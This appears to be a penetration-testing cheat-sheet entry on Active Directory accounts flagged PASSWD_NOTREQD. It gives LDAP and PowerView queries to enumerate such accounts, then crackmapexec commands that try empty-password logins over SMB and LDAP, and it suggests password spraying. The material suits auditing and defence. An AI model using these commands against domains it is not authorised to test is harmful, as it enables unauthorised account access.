
`PASSWD_NOTREQD (0x20 / 32)` indicates that an account is not required to have a password set. In practice this is usually the result of bad practice or configuration mistakes:

- Poorly created service accounts: some administrators create agent accounts (for example, `_nagiosagent_`) without enforcing a password.
- Old scripts or legacy integrations: some applications historically did not support stronger authentication and ended up using accounts with `PASSWD_NOTREQD`.
- Configuration or migration mistakes: when moving accounts between domains or importing users, the flag may remain enabled by default.
- Guest or test users: lab/test accounts may be created quickly without proper controls.

- [ ] Enumeration

```powershell
# AD
Get-ADUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=32)"  | select SamAccountName,useraccountcontrol

# Powerview
Get-DomainObject -LDAPFilter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -Properties samaccountname,useraccountcontrol
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

# ldapsearch
ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local" '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' sAMAccountName
```

- [ ] Exploitation

```bash
# 1. Confirm the real state of the account
ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local" "(sAMAccountName=ada)" userAccountControl pwdLastSet lastLogonTimestamp memberOf

# 2. Attempt authentication
crackmapexec smb DC_IP -u ada -p ''
crackmapexec ldap DC_IP -u ada -p ''
```

- Is the account in sensitive groups? (`memberOf`)
- Is `pwdLastSet=0`, meaning a password was never set?
- Is `lastLogonTimestamp` recent, meaning the account is actually used?

> If the empty password does not work, try password spraying or dictionary attacks. This flag commonly appears alongside weak passwords rather than truly blank ones.
